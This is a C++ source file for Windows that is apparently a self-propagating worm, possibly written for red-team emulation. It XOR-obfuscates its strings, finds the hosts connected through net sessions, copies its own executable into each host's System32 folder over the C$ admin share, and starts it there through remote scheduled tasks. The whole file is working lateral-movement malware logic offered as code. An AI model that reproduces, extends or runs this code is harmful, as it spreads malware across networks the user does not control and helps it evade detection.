#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <format>
#include <exception>
#include "logger.hpp"
#include "xor_obfuscation.hpp"
#include "sessions.hpp"
#include "lat_move.hpp"
#include "string_util.hpp"
#include <filesystem>

#ifndef DEBUG_LOGGING
    #define DEBUG_LOGGING false
#endif

int main(int argc, char* argv[]) {
    // Initialize logger
    std::string log_path = XOR_LIT("test8.log");
    int init_result = Logger::InitializeLogger(log_path);
    if (init_result != 0) {
        std::string err_msg = std::format("{}: {}", XOR_LIT("Failed to initialize logger. Error code"), init_result);
        std::cerr << err_msg << std::endl;
        return init_result;
    }

    Logger::LogInfo(XOR_LIT("Initialized logger."));

    // Get path to current executable to propagate
    std::filesystem::path exec_path;
    try {
        exec_path = std::filesystem::path(lat_move::GetCurrExecutablePath());
    } catch (const std::exception& e) {
        Logger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when getting path to self"), e.what()));
        return 1;
    } catch (...) {
        Logger::LogError(XOR_LIT("Unknown exception when getting path to self."));
    }
    std::wstring filename = exec_path.filename().wstring();
    Logger::LogDebug(std::format(
        "{} {}", 
        XOR_LIT("Found self at"),
        exec_path.string()
    ));

    // Enumerate net sessions
    std::vector<std::wstring> net_sessions;
    try {
        net_sessions = sessions::GetConnectedHosts();
        Logger::LogInfo(std::format("{}: {}", XOR_LIT("Total number of unique remote hosts discovered"), net_sessions.size()));
    } catch (const std::exception& e) {
        Logger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when getting net sessions"), e.what()));
        return 2;
    } catch (...) {
        Logger::LogError(XOR_LIT("Unknown exception when getting net sessions."));
        return 3;
    }

    // Copy self to remote system32 and create scheduled tasks for lateral movement
    std::wstring task_exec_path = std::format(L"{}{}", XOR_WIDE_LIT(L"C:\\Windows\\System32\\"), filename);
    for (const std::wstring& target: net_sessions) {
        Logger::LogDebug(std::format(
            "{} {}",
            XOR_LIT("Copying self to"),
            string_util::wstring_to_string(target)
        ));
        std::wstring remote_path = std::format(
            L"{}{}{}{}",
            XOR_WIDE_LIT(L"\\\\"),
            target,
            XOR_WIDE_LIT(L"\\C$\\Windows\\System32\\"),
            filename
        );
        if (CopyFileW(exec_path.c_str(), remote_path.c_str(), false)) {
            Logger::LogInfo(std::format(
                "{} {}",
                XOR_LIT("Successfully copied self to"), 
                string_util::wstring_to_string(remote_path)
            ));
        } else {
            Logger::LogError(std::format(
                "{} {} {} {}",
                XOR_LIT("Failed to copy self to"), 
                string_util::wstring_to_string(remote_path),
                XOR_LIT("Error code:"),
                GetLastError()
            ));
            continue;
        }
        try {
            lat_move::CreateAndExecRemoteScheduledTask(target, task_exec_path, L"");
        } catch (const std::exception& e) {
            Logger::LogError(std::format("{}: {}", XOR_LIT("Caught exception creating scheduled tasks"), e.what()));
        } catch (...) {
            Logger::LogError(XOR_LIT("Unknown exception when creating scheduled tasks."));
        }
    }
    
    Logger::LogInfo(XOR_LIT("Finished"));

    return 0;
}